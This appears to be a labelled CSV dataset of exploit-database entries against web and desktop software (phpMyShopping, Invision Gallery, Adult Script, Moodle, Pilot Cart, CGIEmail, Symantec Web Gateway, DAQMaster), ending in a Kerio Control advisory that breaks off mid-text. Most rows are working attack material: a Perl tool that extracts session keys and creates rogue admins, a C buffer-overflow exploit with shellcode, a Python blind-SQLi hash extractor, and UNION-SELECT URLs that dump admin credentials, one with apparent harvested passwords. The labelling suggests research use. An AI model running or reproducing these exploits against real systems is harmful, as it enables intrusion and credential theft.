15173,"phpMyShopping 1.0.1505 - Multiple Vulnerabilities #################################################################### .:. Author : Metropolis .:. Home : www.metropolis.fr.cr  .:. Script : PhpMyShopping  .:. Version : v1.0.1505 .:. Download Script: http://www.phpmyshopping.org/night_build/PhpMyShopping_mono_boutique_v1.0.1505.tar.gz .:. Bug Type : Multiple Vulnerabilities / Blind SQL Injections / XSS   ####################################################################   ===[ Blind Sql Injection ]===   SQL Error =>   /detail_article.php?C=3&P=7'    www.site.com/detail_article.php?C=3&P=7 [Blind]  [Demo] :  www.site.com/detail_article.php?C=3&P=1 and 1=1 <-- true  www.site.com/detail_article.php?C=3&P=1 and 1=2 <-- false  ===[ XSS ]===   www.site.com/detail_article.php?C=3&P=7 [XSS]  [Demo] :    www.site.com/detail_article.php?C=3&P=7""><script>alert(document.cookie);</script>    ####################################################################",['1.0.1505'],1
4966,"Invision Gallery 2.0.7 - SQL Injection #!/usr/bin/perl  ## Invision Gallery version <= 2.0.7 sql injection exploit ## (c)oded by 1dt.w0lf ## RST/GHC  ##        THIS IS UNPUBLISHED RST/GHC EXPLOIT CODE ##                   KEEP IT PRIVATE  use Tk; use Tk::BrowseEntry; use Tk::DialogBox; use LWP::UserAgent;  $mw = new MainWindow(title => ""r57ig207"" );  $mw->geometry ( '420x510' ) ; $mw->resizable(0,0);  $mw->Label(-text => '!', -font => '{Webdings} 22')->pack(); $mw->Label(-text => 'Invision Gallery <=2.0.7 sql injection exploit by RST/GHC', -font => '{Verdana} 7 bold',-foreground=>'red')->pack(); $mw->Label(-text => '')->pack();  $fleft=$mw->Frame()->pack ( -side => 'left', -anchor => 'ne') ; $fright=$mw->Frame()->pack ( -side => 'left', -anchor => 'nw') ;  $url = 'http://server/forum/index.php'; $user_id = '1'; $prefix = 'ibf_'; $table = 'members'; $column = 'member_login_key'; $new_admin_name = 'rstghc'; $new_admin_password = 'rstghc'; $new_admin_email = 'billy@microsoft.com'; $report = ''; $group = 1; $curr_user = 0; $use_custom_fields = 0; $custom_fields = 'name1=value1,name2=value2';  $fleft->Label ( -text => 'Path to forum index: ', -font => '{Verdana} 8 bold') ->pack ( -side => ""top"" , -anchor => 'e' ) ; $fright->Entry ( -relief => ""groove"", -width => 35, -font => '{Verdana} 8', -textvariable => \$url) ->pack ( -side => ""top"" , -anchor => 'w' ) ;  $fleft->Label ( -text => 'User ID: ', -font => '{Verdana} 8 bold' ) ->pack ( -side => ""top"" , -anchor => 'e' ) ; $fright->Entry ( -relief => ""groove"", -width => 35, -font => '{Verdana} 8', -textvariable => \$user_id) ->pack ( -side => ""top"" , -anchor => 'w' ) ;  $fleft->Label ( -text => 'Database tables prefix: ', -font => '{Verdana} 8 bold') ->pack ( -side => ""top"" , -anchor => 'e' ) ; $fright->Entry ( -relief => ""groove"", -width => 35, -font => '{Verdana} 8', -textvariable => \$prefix) ->pack ( -side => ""top"" , -anchor => 'w' ) ;  $fright->Label( -text => ' ')->pack(); $fleft->Label( -text => ' ')->pack();  $fleft->Label ( -text => 'get data from database', -font => '{Verdana} 8 bold',-foreground=>'green') ->pack ( -side => ""top"" , -anchor => 'e' ) ; $fright->Label( -text => ' ')->pack();  $fleft->Label ( -text => 'Get data from table: ', -font => '{Verdana} 8 bold') ->pack ( -side => ""top"" , -anchor => 'e' ) ; $b2 = $fright->BrowseEntry( -command => \&update_columns, -relief => ""groove"", -variable => \$table, -font => '{Verdana} 8'); $b2->insert(""end"", ""members""); $b2->insert(""end"", ""members_converge""); $b2->insert(""end"", ""admin_sessions""); $b2->insert(""end"", ""validating""); $b2->pack( -side => ""top"" , -anchor => 'w');  $fleft->Label ( -text => 'Get data from column: ', -font => '{Verdana} 8 bold') ->pack ( -side => ""top"" , -anchor => 'e' ) ; $b = $fright->BrowseEntry( -relief => ""groove"", -variable => \$column, -font => '{Verdana} 8'); $b->insert(""end"", ""member_login_key""); $b->insert(""end"", ""name""); $b->insert(""end"", ""ip_address""); $b->insert(""end"", ""legacy_password""); $b->insert(""end"", ""email""); $b->pack( -side => ""top"" , -anchor => 'w' );  $fleft->Label ( -text => 'Returned data: ', -font => '{Verdana} 8 bold') ->pack ( -side => ""top"" , -anchor => 'e' ) ; $fright->Entry ( -relief => ""groove"", -width => 35, -font => '{Verdana} 8', -textvariable => \$report) ->pack ( -side => ""top"" , -anchor => 'w' ) ;  $fleft->Label ( -text => 'create new admin', -font => '{Verdana} 8 bold',-foreground=>'green') ->pack ( -side => ""top"" , -anchor => 'e' ) ; $fright->Label( -text => ' ')->pack();  $fleft->Label ( -text => 'session_id: ', -font => '{Verdana} 8 bold') ->pack ( -side => ""top"" , -anchor => 'e' ) ; $fright->Entry ( -relief => ""groove"", -width => 35, -font => '{Verdana} 8', -textvariable => \$session_id) ->pack ( -side => ""top"" , -anchor => 'w' ) ;  $fleft->Label ( -text => 'session_ip_address: ', -font => '{Verdana} 8 bold') ->pack ( -side => ""top"" , -anchor => 'e' ) ; $fright->Entry ( -relief => ""groove"", -width => 35, -font => '{Verdana} 8', -textvariable => \$session_ip_address) ->pack ( -side => ""top"" , -anchor => 'w' ) ;  $fleft->Label ( -text => 'new admin name: ', -font => '{Verdana} 8 bold') ->pack ( -side => ""top"" , -anchor => 'e' ) ; $fright->Entry ( -relief => ""groove"", -width => 35, -font => '{Verdana} 8', -textvariable => \$new_admin_name) ->pack ( -side => ""top"" , -anchor => 'w' ) ;  $fleft->Label ( -text => 'new admin password: ', -font => '{Verdana} 8 bold') ->pack ( -side => ""top"" , -anchor => 'e' ) ; $fright->Entry ( -relief => ""groove"", -width => 35, -font => '{Verdana} 8', -textvariable => \$new_admin_password) ->pack ( -side => ""top"" , -anchor => 'w' ) ;  $fleft->Label ( -text => 'new_admin_email: ', -font => '{Verdana} 8 bold') ->pack ( -side => ""top"" , -anchor => 'e' ) ; $fright->Entry ( -relief => ""groove"", -width => 35, -font => '{Verdana} 8', -textvariable => \$new_admin_email) ->pack ( -side => ""top"" , -anchor => 'w' ) ;  $fleft->Label ( -text => ' ')->pack(); $fright->Checkbutton( -font => '{Verdana} 8', -text => 'Use custom profile fields', -variable => \$use_custom_fields)->pack(-side => ""top"" , -anchor => 'w');  $fleft->Label ( -text => 'custom fields: ', -font => '{Verdana} 8 bold') ->pack ( -side => ""top"" , -anchor => 'e' ) ; $fright->Entry ( -relief => ""groove"", -width => 35, -font => '{Verdana} 8', -textvariable => \$custom_fields) ->pack ( -side => ""top"" , -anchor => 'w' ) ;  $fright->Label( -text => ' ')->pack();  $fright->Button(-text    => 'Test forum vulnerability',                 -relief => ""groove"",                 -width => '30',                 -font => '{Verdana} 8 bold',                 -activeforeground => 'red',                 -command => \&test_vuln                )->pack();  $fright->Button(-text    => 'Get database tables prefix',                 -relief => ""groove"",                 -width => '30',                 -font => '{Verdana} 8 bold',                 -activeforeground => 'red',                 -command => \&get_prefix                )->pack();  $fright->Button(-text    => 'Get data from database',                 -relief => ""groove"",                 -width => '30',                 -font => '{Verdana} 8 bold',                 -activeforeground => 'red',                 -command => \&get_data                )->pack();  $fright->Button(-text    => 'Create new admin',                 -relief => ""groove"",                 -width => '30',                 -font => '{Verdana} 8 bold',                 -activeforeground => 'red',                 -command => \&create_admin                )->pack();    $fleft->Label( -text => ' ')->pack(); $fleft->Label( -text => '+++ PRIV8 +++', -font => '{Verdana} 7')->pack(); $fleft->Label( -text => '(c)oded by 1dt.w0lf', -font => '{Verdana} 7')->pack(); $fleft->Label( -text => 'RST/GHC', -font => '{Verdana} 7')->pack();  MainLoop();  sub update_columns()  {  $b->delete(0,""end"");  if($table eq 'members'){  $column = ""member_login_key"";    $b->insert(""end"", ""member_login_key"");  $b->insert(""end"", ""name"");  $b->insert(""end"", ""ip_address"");  $b->insert(""end"", ""legacy_password"");  $b->insert(""end"", ""email"");  } elsif($table eq 'members_converge'){  $column = ""converge_pass_hash"";    $b->insert(""end"", ""converge_pass_hash"");  $b->insert(""end"", ""converge_pass_salt"");  $b->insert(""end"", ""converge_email"");  } elsif($table eq 'admin_sessions'){  $column = ""session_id"";    $b->insert(""end"", ""session_id"");  $b->insert(""end"", ""session_ip_address"");  $b->insert(""end"", ""session_member_name"");  $b->insert(""end"", ""session_member_id"");  } elsif($table eq 'validating'){  $column = ""vid"";    $b->insert(""end"", ""vid"");  }  }  sub get_data() { $xpl = LWP::UserAgent->new( ) or die; $InfoWindow=$mw->DialogBox(-title   => 'get data from database', -buttons => [""OK""]); if($table eq 'members') { $id_text = 'id'; } if($table eq 'members_converge') { $id_text = 'converge_id'; } if($table eq 'admin_sessions') { $id_text = 'session_member_id'; } if($table eq 'validating') { $id_text = 'member_id'; } $i = 1; $report = ''; while(1)  {  $ret = get_char($i);  if($ret == 0) { last; }  else { $report .= chr($ret); $i++; $mw->update(); }  }  if($report eq '') {  $InfoWindow->add('Label', -text => 'Can\'t get data', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;  } else {  if($column eq 'session_id') { $session_id = $report; $mw->update(); }  elsif($column eq 'session_ip_address') { $session_ip_address = $report; $mw->update(); }  $InfoWindow->add('Label', -text => 'Done!', -font => '{Verdana} 8 bold',-foreground=>'green')->pack;  }    $InfoWindow->Show();  $InfoWindow->destroy; }  sub get_char()  {  $res = $xpl->get($url.""?automodule=gallery&cmd=rate&img=1&rating=1&album=-1 union select 1,ascii(substring("".$column."","".$_[0]."",1)),1,1,1,1,1,1,1,1 FROM $prefix$table WHERE $id_text = $user_id"");  if($res->as_string =~ /cmd=user&user=(\d*)&op=view_album/) { $rep = $1; }  else { $rep = 0; }  return $rep;  }   sub create_admin()  {  $InfoWindow=$mw->DialogBox(-title   => 'create new admin', -buttons => [""OK""]);  if($session_id eq '' || $session_ip_address eq '')   {   $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;   $InfoWindow->add('Label', -text => 'You need insert admin session_id and session_ip_address', -font => '{Verdana} 8')->pack;   }  elsif($session_ip_address !~ /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/)   {   $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;   $InfoWindow->add('Label', -text => 'session_ip_address wrong!', -font => '{Verdana} 8')->pack;   }  else   {  $xpl = LWP::UserAgent->new( ) or die;  ($url2 = $url) =~ s/index.php/admin.php/;  $cf = '';  %fields = (  'code'     => 'doadd',  'act'      => 'mem',  'section'  => 'content',  'name'     => $new_admin_name,  'password' => $new_admin_password,  'email'    => $new_admin_email,  'mgroup'   => 4, ## default admin group , maybe need change                );  if($use_custom_fields)   {   @cf = split(',',$custom_fields);   foreach(@cf) { ($k,$v) = split('=',$_); $fields{$k} = $v;}   }    $res = $xpl->post($url2.""?adsess=$session_id"",  [  %fields,  ],  'USER_AGENT'=>'',  'CLIENT_IP'=>""$session_ip_address"",  'X_FORWARDED_FOR'=>""$session_ip_address"");  $InfoWindow->add('Label', -text => 'Done!', -font => '{Verdana} 8 bold',-foreground=>'green')->pack;  $InfoWindow->add('Label', -text => 'New admin created', -font => '{Verdana} 8 bold')->pack;    }  $InfoWindow->Show();  $InfoWindow->destroy;  }  sub test_vuln() { $InfoWindow=$mw->DialogBox(-title   => 'test forum vulnerability', -buttons => [""OK""]); $InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack; $InfoWindow->add('Label', -text => $url, -font => '{Verdana} 8')->pack; $InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack; $xpl = LWP::UserAgent->new( ) or die; $res = $xpl->get($url.""?automodule=gallery&cmd=rate&img=1&rating=1&album=-1 union select 1,11457,1,1,1,1,1,1,1,1/*""); if($res->is_success)  {  $rep = '';  if($res->as_string =~ /cmd=user&user=(\d*)&op=view_album/) { $rep = $1; }  if($rep == 11457) { $InfoWindow->add('Label', -text => 'FORUM VULNERABLE', -font => '{Verdana} 8 bold',-foreground=>'red')->pack; }  else { $InfoWindow->add('Label', -text => 'FORUM UNVULNERABLE', -font => '{Verdana} 8 bold',-foreground=>'green')->pack; }  } else  {  $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;  $InfoWindow->add('Label', -text => $res->status_line, -font => '{Verdana} 8')->pack;  } $InfoWindow->Show(); $InfoWindow->destroy; }    sub get_prefix() { $InfoWindow=$mw->DialogBox(-title   => 'get database tables prefix', -buttons => [""OK""]); $InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack; $InfoWindow->add('Label', -text => $url, -font => '{Verdana} 8')->pack; $InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack; $xpl = LWP::UserAgent->new( ) or die; $res = $xpl->get($url.""?automodule=gallery&cmd=rate&img=1&rating=1&album=-1\\""); if($res->is_success)  {  $rep = '';  if($res->as_string =~ /FROM (.*)gallery_albums/)  {  $prefix = $1;  $InfoWindow->add('Label', -text => 'Prefix: '.$prefix, -font => '{Verdana} 8 bold')->pack;  }  else  {  $InfoWindow->add('Label', -text => 'Can\'t get prefix', -font => '{Verdana} 8 bold',-foreground=>'red')->pack; }  } else  {  $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;  $InfoWindow->add('Label', -text => $res->status_line, -font => '{Verdana} 8')->pack;  } $InfoWindow->Show(); $InfoWindow->destroy;   }  # milw0rm.com [2008-01-22]",['2.0.7'],1
4775,"Adult Script 1.6.5 - Multiple SQL Injections ---------------------------------------------------------------  ____            __________         __             ____  __    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_   |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\  |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |    |___|___|  /\__|  /______  /\___  >__|            |___||__|             \/\______|      \/     \/                            ---------------------------------------------------------------  Http://www.inj3ct-it.org	    Staff[at]inj3ct-it[dot]org	  ---------------------------------------------------------------  	Multiple Remote Sql Injection  ---------------------------------------------------------------  # Author: MhZ91  # Title: Adult Script - Remote Sql Injection # Download: http://adultscript.net/  # Bug: Remote Sql Injection  # Visit: http://www.inj3ct-it.org  ---------------------------------------------------------------  http://[site]/videolink_count.php?id=-1+union+select+concat(admin_user,char(58),admin_pass,char(58),admin_email)+from+admin  http://[site]/links.php?id=-1+union+select+concat(admin_user,char(58),admin_pass,char(58),admin_email)+from+admin  Whit this u get user:password:email in the page of the error or in the url of the browser :D   Tested on the official demo site http://adultscript.net/demo/ and it work very good!   ---------------------------------------------------------------  # milw0rm.com [2007-12-23]",['1.6.5'],1
28770,"Moodle Blog 1.18.2.2/1.6.2 Module - SQL Injection source: https://www.securityfocus.com/bid/20395/info  Moodle is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting this issue may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.  Moodle 1.6.2 is reported vulnerable; prior versions may also be affected.  http://www.example.com/blog/index.php?tag=x%2527%20UNION%20SELECT%20%2527-1%20UNION%20SELECT%201,1,1,1,1,1,1,username,password,1,1,1,1,1,1,1,username,password,email%20 FROM%20mdl_user%20RIGHT%20JOIN%20mdl_user_admins%20ON%20mdl_user.id%3dmdl_user_admins.userid%20UNION%20SELECT%201,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20F ROM%20mdl_post%20p,%20mdl_blog_tag_instance%20bt,%20mdl_user%20u%20WHERE%201%3D0%2527,1,1,%25271","['1.18.2.2/1.6.2', '1.6.2']",0
39393,"Autonics DAQMaster 1.7.3 - DQP Parsing Buffer Overflow Code Execution (PoC) ﻿ Autonics DAQMaster 1.7.3 DQP Parsing Buffer Overflow Code Execution   Vendor: Autonics Corporation Product web page: https://www.autonics.com Affected version: 1.7.3 (build 2454)                   1.7.0 (build 2333)                   1.5.0 (build 2117)  Summary: DAQMaster is comprehensive device management program that can be used with Autonics thermometers, panel meters, pulse meters, and counters, etc and with Konics recorders, indicators. DAQMaster provides GUI control for easy and convenient management of parameters and multiple device data monitoring.  Desc: The vulnerability is caused due to a boundary error in the processing of a project file, which can be exploited to cause a buffer overflow when a user opens e.g. a specially crafted .DQP project file with a large array of bytes inserted in the 'Description' element. Successful exploitation could allow execution of arbitrary code on the affected machine.  ---------------------------------------------------------------------  (ee8.1ee8): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=41414141 ebx=57010748 ecx=02bb9a00 edx=00808080 esi=00000001 edi=00000001 eip=00405d45 esp=0018f59c ebp=0018f91c iopl=0         nv up ei pl nz na pe nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206 DAQMaster!TClsValueListShowData$qqrp16GraphicsTBitmapip10TPropValuei+0x41d: 00405d45 8b10            mov     edx,dword ptr [eax]  ds:002b:41414141=????????  ---------------------------------------------------------------------  Tested on: Microsoft Windows 7 Professional SP1 (EN)            Microsoft Windows 7 Ultimate SP1 (EN)   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2016-5302 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5302.php   20.11.2015  --   thricer.dqp project PoC:  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39393.zip ------------------------  <DAQMaster xmlns=""http://www.w3.org/2001/XMLSchema-instance""> <Project>  <General>   <Name>Noname</Name>   <Company></Company>   <Worker></Worker>   <Description>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...[n]</Description>   <DataFolder>C:\Users\zslab\Documents</DataFolder>   <DeskLayout>0</DeskLayout>   <NameRule></NameRule>   <FileType>0</FileType>   <RunMode>0</RunMode>   <Schedule Active=""0""/>   <Layout>0</Layout>  </General> <System/> <UserTag/> <DDEServer/> <WorkSpace WorkSpaceNum=""1"">   <WorkSpace>DAQ WorkSpace</WorkSpace> </WorkSpace> <UIList/> <Layout/> </Project> </DAQMaster>",['1.7.3'],1
21998,"CGIEmail 1.6 - Remote Buffer Overflow // source: https://www.securityfocus.com/bid/6141/info  A vulnerability has been discovered in CGIEmail. It should be noted that this vulnerability exists only if the server allows queries to remote hosts.  A remotely exploitable buffer overflow has been discovered in a component included with CGIEmail. By sending a maliciously constructed GET request to the vulnerable server, it is possible for a remote attacker to overrun a buffer, potentially resulting in the execution of arbitrary system commands with the privileges of the mail server.  /*  * cso.c (06/30/01)  *  * Remote exploit for cgicso included with cgiemail 1.6  * Tested on Slackware Linux 7.1 running Apache 1.3.20  * Spawns an xterm on your display.  *  *  * Note: In order to exploit, cgicso must be compiled with  * CGI_CSO_HARDCODE undefined, otherwise it will bypass  * the exploitable portion of code.  *  *  * Exploit By: isox of hhp. (isox@chainsawbeer.com)  * Site: www.hhp-programming.net && 0xc0ffee.com */  #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/socket.h> #include <netinet/in.h> #include <netdb.h>  #define RET 0xbfffe208 // Slackware 7.1.0 #define LEN 2038 #define PORT 80  char noncode[] =   ""\xeb\x4f\x5e\x31\xd2\x88\x56\x14\x88\x56\x18\x88\x56\x21\xb2\x2b""   ""\x31\xc9\xb1\x09\x80\x3c\x32\x4b\x74\x05\x42\xe2\xf7\xeb\x2b\x88""   ""\x34\x32\x31\xd2\x89\xf3\x89\x76\x36\x8d\x7e\x15\x89\x7e\x3a\x8d""   ""\x7e\x19\x89\x7e\x3e\x8d\x7e\x22\x89\x7e\x42\x89\x56\x46\x8d\x4e""   ""\x36\x8d\x56\x46\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd""   ""\x80\xe8\xac\xff\xff\xff""   ""/usr/X11R6/bin/xterm8-ut8-display8127.0.0.1:0K"";  char code[] =   ""%eb%4f%5e%31%d2%88%56%14%88%56%18%88%56%21%b2%2b%31%c9%b1%9%80%3c""   ""%32%4b%74%5%42%e2%f7%eb%2b%88%34%32%31%d2%89%f3%89%76%36%8d%7e%15""   ""%89%7e%3a%8d%7e%19%89%7e%3e%8d%7e%22%89%7e%42%89%56%46%8d%4e%36%8d""   ""%56%46%31%c0%b0%b%cd%80%31%db%89%d8%40%cd%80%e8%ac%ff%ff%ff%2f%75""   ""%73%72%2f%58%31%31%52%36%2f%62%69%6e%2f%78%74%65%72%6d%38%2d%75%74""   ""%38%2d%64%69%73%70%6c%61%79%38""   ""%31%32%37%2e%30%2e%30%2e%31"" // unicoded IP address   ""%3a%30%4b"";    int main(int argc, char *argv[]) {   char *buf, *p;   long *addressp, address=RET;   int i, diff=(strlen(code) - strlen(noncode)), sock, debug=0;   struct hostent *t;   struct sockaddr_in s;     if(argc < 2) {     fprintf(stderr, ""usage: %s <host> [offset [--debug]]\n"", argv[0]);     exit(-1);   }    if(argc > 2)     address -= atoi(argv[2]);    if(argc > 3) {     if((!strcmp(argv[3], ""--debug"")) || (!strcmp(argv[3], ""-d"")))       debug = 1;   }     fprintf(stderr, ""Using Address: 0x%lx\n"", address);    buf = (char *)malloc(44 + LEN + diff + 1);   p = buf;     (*p++) = 'G';   (*p++) = 'E';   (*p++) = 'T';   (*p++) = ' ';   (*p++) = '/';   (*p++) = 'c';   (*p++) = 'g';   (*p++) = 'i';   (*p++) = '-';   (*p++) = 'b';   (*p++) = 'i';   (*p++) = 'n';   (*p++) = '/';   (*p++) = 'c';   (*p++) = 'g';   (*p++) = 'i';   (*p++) = 'c';   (*p++) = 's';   (*p++) = 'o';   (*p++) = '?';   (*p++) = 'f';   (*p++) = 'i';   (*p++) = 'n';   (*p++) = 'g';   (*p++) = 'e';   (*p++) = 'r';   (*p++) = 'h';   (*p++) = 'o';   (*p++) = 's';   (*p++) = 't';   (*p++) = '=';   (*p++) = 'A'; // Yes this should be an A   (*p++) = '&';   (*p++) = 'q';   (*p++) = 'u';   (*p++) = 'e';   (*p++) = 'r';   (*p++) = 'y';   (*p++) = '=';   (*p++) = 'A'; // Yes this should be an A   (*p++) = 'A'; // Yes this should be an A   (*p++) = 'A'; // Yes this should be an A    for(i=0; i<strlen(code); i++)     (*p++) = code[i];    addressp = (long *)p;    for(i=0; i<(LEN - strlen(code)) + diff; i+=4)     (*addressp++) = address;     strcat(buf, ""\n\n"");   fprintf(stderr, ""Using length: %d\n"", strlen(buf));     /*  * Connect  */    if(s.sin_addr.s_addr=inet_addr(argv[1])) {     if(!(t=gethostbyname(argv[1]))) {       printf(""Connection Failed.\n"");       exit(-1);     }      memcpy((char*)&s.sin_addr,(char*)t->h_addr,sizeof(s.sin_addr));   }    s.sin_family=AF_INET;   s.sin_port=htons(PORT);    sock=socket(AF_INET,SOCK_STREAM,0);     if(connect(sock,(struct sockaddr*)&s,sizeof(s))) {     fprintf(stderr, ""Connection failed.\n"");     exit(-1);   }    fprintf(stderr, ""done.\n"");   fprintf(stderr, ""Sending buffer... "");   send(sock, buf, strlen(buf), 0);   fprintf(stderr, ""done.\n"");    sleep(2);    if(debug == 1) {     fprintf(stderr, ""Entering Debug Mode... \n"");     initstream(sock);   }    close(sock);   free(buf);   exit(0); }    int initstream(int sock) {   int n;   char recvbuf[1024];   fd_set rset;    while (1) {     FD_ZERO(&rset);     FD_SET(sock,&rset);     FD_SET(STDIN_FILENO,&rset);     select(sock+1,&rset,NULL,NULL,NULL);      if (FD_ISSET(sock,&rset)) {       if((n=read(sock,recvbuf,1024)) <= 0) {         printf(""Connection closed by foreign host.\n"");         exit(0);       }        recvbuf[n]=0;       printf(""%s"",recvbuf);     }      if (FD_ISSET(STDIN_FILENO,&rset)) {       if((n=read(STDIN_FILENO,recvbuf,1024)) > 0) {         recvbuf[n]=0;         write(sock,recvbuf,n);       }     }   }    return; }",['1.6'],1
20038,"Symantec Web Gateway 5.0.2 - 'blocked.php?id' Blind SQL Injection #!/usr/bin/python  ###################################################################################### # Exploit Title: Symantec Web Gateway 5.0.2 (blocked.php id parameter) Blind SQL Injection # Date: Jul 23 2012 # Author: muts # Version: Symantec Web Gateway 5.0.2 # Vendor URL: http://www.symantec.com # # Timeline: # # 29 May 2012: Vulnerability reported to CERT # 30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012 # 26 Jun 2012: Email received from Symantec for additional information # 26 Jun 2012: Additional proofs of concept sent to Symantec # 06 Jul 2012: Update received from Symantec with intent to fix # 20 Jul 2012: Symantec patch released: http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120720_00 # 23 Jul 2012: Public Disclosure # ######################################################################################  import urllib import time import sys from time import sleep  # Set your timing variable. A minimum value of 200 (2 seconds) was tested on localhost. # This might need to be higher on production systems.  timing=300  def check_char(i,j,timing):  	url = 	(""https://172.16.254.111/spywall/blocked.php?d=3&file=3&id=1)"" + 		"" or 1=(select IF(conv(mid((select password from users),%s,1),16,10) ""+ 		""= %s,BENCHMARK(%s,rand()),11) LIMIT 1&history=-2&u=3"") % (j,i,timing) 	start=time.time() 	urllib.urlopen(url) 	end =time.time() 	howlong=int(end-start) 	return howlong  counter=0 startexploit=time.time() print ""[*] Symantec \""Wall of Spies\"" hash extractor"" print ""[*] Time Based SQL injection, please wait..."" sys.stdout.write(""[*] Admin hash is : "") sys.stdout.flush()  for m in range(1,33): 	for n in range(0,16): 		counter= counter+1 		output = check_char(n,m,timing) 		if output > ((timing/100)-1): 			byte =hex(n)[2:] 			sys.stdout.write(byte) 			sys.stdout.flush() 			break endexploit=time.time() totalrun=str(endexploit-startexploit) print ""\n[*] Total of %s queries in %s seconds"" % (counter,totalrun)",['5.0.2'],1
15497,"ASPilot Pilot Cart 7.3 - 'newsroom.asp' SQL Injection # Title: [ASPilot Pilot Cart 7.3 SQL Injection] # Date: [12.11.2010] # Author: [Daikin] # Software Link: [http://www.pilotcart.com] # Version: [7.3] maybe also lower   Vendor's Description of Software and demo: # http://www.pilotcart.com   Dork: # Powered by Pilot Cart V.7.3   Application Info: # Name: Pilot Cart # version last 7.3   Vulnerability Info: # Type: SQL injection # Discover 8/11/2010    #Vuln description: Input passed via the ""specific"" parameter to newsroom.asp is not properly sanitised before being used in a SQL query.  http://server/newsroom.asp?specific=[injection]  #Proof  http://server/newsroom.asp?specific=1  DB: MSAccess  http://server/newsroom.asp?specific=-1%20UNION%20ALL%20SELECT%20null,(select%20top%201%20chr(126)%2bchr(39)%2bcstr(email)%2bchr(39)%2bchr(126)%20from%20(select%20top%201%20*%20from%20(select%20top%201%20*%20from%20tbllogins%20order%20by%201)%20t%20order%20by%201%20desc)t),null,null,null,null,null%20from%20tbllogins -->mail field ""scarab""  http://server/newsroom.asp?specific=-1%20UNION%20ALL%20SELECT%20null,(select%20top%201%20chr(126)%2bchr(39)%2bcstr(pword)%2bchr(39)%2bchr(126)%20from%20(select%20top%201%20*%20from%20(select%20top%201%20*%20from%20tbllogins%20order%20by%201)%20t%20order%20by%201%20desc)t),null,null,null,null,null%20from%20tbllogins -->pass field ""R1ckr011""  # Credit: Daikin   bolidebolidebolide@gmail.com","['7.3', 'last']",0
40414,"Kerio Control Unified Threat Management 9.1.0 build 1087/9.1.1 build 1324 - Multiple Vulnerabilities SEC Consult has also released a blog post describing the attack scenarios of the vulnerabilities within this advisory in detail and a video which shows the remote attack. Exploit code has been developed as well but will not be released for now.  Blog: http://blog.sec-consult.com/2016/09/controlling-kerio-control-when-your.html  Video: https://www.youtube.com/watch?v=y_OWz25sHMI   SEC Consult Vulnerability Lab Security Advisory < 20160922-0 > =======================================================================               title: Potential backdoor access through multiple vulnerabilities             product: Kerio Control Unified Threat Management  vulnerable version: <9.1.3, verified in version 9.1.0 build 1087 and 9.1.1                      build 1324       fixed version: 9.1.3 (partially fixed, see vendor statement below)          CVE number: -              impact: critical            homepage: http://www.kerio.com/               found: 2016-08-24                  by: R. Freingruber (Office Vienna)                      R. Tavakoli (Office Vienna)                      SEC Consult Vulnerability Lab                       An integrated part of SEC Consult                      Bangkok - Berlin - Linz - Montreal - Moscow                      Singapore - Vienna (HQ) - Vilnius - Zurich                       https://www.sec-consult.com  =======================================================================  Vendor description: ------------------- ""Protect your network from viruses, malware and malicious activity with Kerio Control, the easy-to-administer yet powerful all-in-one security solution. Kerio Control brings together next-generation firewall capabilities - including a network firewall and router, intrusion detection and prevention (IPS), gateway anti-virus, VPN, and web contentand application filtering. These comprehensive capabilities and unmatched deployment flexibility make Kerio Control the ideal choice for small and mid-sized businesses.""  Source: http://www.kerio.com/products/kerio-control   Business recommendation: ------------------------ By combining the vulnerabilities documented in this advisory an attacker can fully compromise a network which uses the Kerio Control appliance for protection.  The attacker can trick a victim to visit a malicious website which then conducts the internal attack. The attacked victim must be logged in or weak credentials must be configured which can be found with a bruteforce attack.  The attacker will gain a reverse root shell from the Internet to the internal Kerio Control firewall system. Moreover, it's possible that an internal attacker uses the described vulnerabilities to escalate his privileges (low privileged account to full root shell) to steal credentials from other users on the UTM appliance.  Most vulnerabilities (RCE, CSRF bypasses, XSS, Heap Spraying) were found in just two PHP scripts. Both scripts are not referenced by any other PHP script nor by any binary on the system. Both scripts contain a different(!), seemingly deliberate(?) CSRF bypass which make the vulnerabilities exploitable from the Internet to obtain a reverse root shell.  SEC Consult recommends not to use Kerio Control until a thorough security review has been performed by security professionals and all identified issues have been resolved.   Vulnerability overview/description: ----------------------------------- 1) Unsafe usage of the PHP unserialize function and outdated PHP version leads    to remote-code-execution An authenticated user (standard user or administrator) can control data, which gets later unserialized. Kerio Control uses PHP 5.2.13 which was released on 2010-02-25. This version is more than 6 years old and several bugs were found in the meantime within the unserialize function. The following CVE numbers are just some examples for vulnerabilities in unserialize which lead to remote code execution:   -) CVE-2014-8142   -) CVE-2014-3515   -) CVE-2015-0231   -) CVE-2015-6834   -) CVE-2016-5771   -) CVE-2016-5773  PHP 5.2.13 is especially affected by CVE-2014-3515. 